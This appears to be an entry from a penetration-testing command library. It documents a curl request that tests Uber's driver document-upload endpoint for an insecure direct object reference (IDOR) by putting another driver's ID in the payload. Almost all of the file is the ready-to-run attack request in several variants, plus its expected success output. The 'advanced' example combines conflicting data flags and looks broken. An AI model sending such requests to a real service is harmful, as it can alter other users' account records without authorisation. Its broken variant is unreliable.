---
data: >-
  curl -X POST 'https://partners.uber.com/p3/drivers/uploadDocument' -H
  'Authorization: Bearer YOUR_DRIVER_TOKEN' -H 'Content-Type: application/json'
  -d '{"driver_id": "TARGET_ID", "document_type": "license", "file":
  "test_file.pdf"}'
tags:
  - web-testing
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 1eca241c-f6e0-4974-8043-c49dc5a187c1
created_at: '2025-12-14T17:25:29.552Z'
updated_at: '2025-12-14T17:25:29.552Z'
verified: false
validated: true
submitted: true
---
# curl-test-idor-upload

## Command

```bash
curl -X POST 'https://partners.uber.com/p3/drivers/uploadDocument' \
  -H 'Authorization: Bearer YOUR_DRIVER_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"driver_id": "TARGET_ID", "document_type": "license", "file": "test_file.pdf"}'
```

## Description

This command tests for IDOR in the Uber document upload endpoint by sending a POST request with a manipulated driver_id, checking if unauthorized uploads succeed.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP method | Yes |
| `-H 'Authorization: Bearer TOKEN'` | Auth header with driver token | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON payload type | Yes |
| `-d '{...}'` | JSON payload with driver_id, document_type, and file | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://partners.uber.com/p3/drivers/uploadDocument' \
  -H 'Authorization: Bearer YOUR_DRIVER_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"driver_id": "TARGET_DRIVER_ID", "document_type": "license", "file": "test_file.pdf"}'
```

### Advanced Usage

```bash
curl -X POST 'https://partners.uber.com/p3/drivers/uploadDocument' \
  -H 'Authorization: Bearer YOUR_DRIVER_TOKEN' \
  -H 'Content-Type: application/json' \
  --data-binary @test_file.pdf \
  -d '{"driver_id": "TARGET_DRIVER_ID", "document_type": "license"}'
```

## Expected Output

Successful response: {"status": "success", "document_id": "new_id"} (HTTP 200). Failure: 403/401 error if access controlled.

## Related

- [[Related Procedure: Identify-IDOR-in-Document-Upload-Endpoint]]
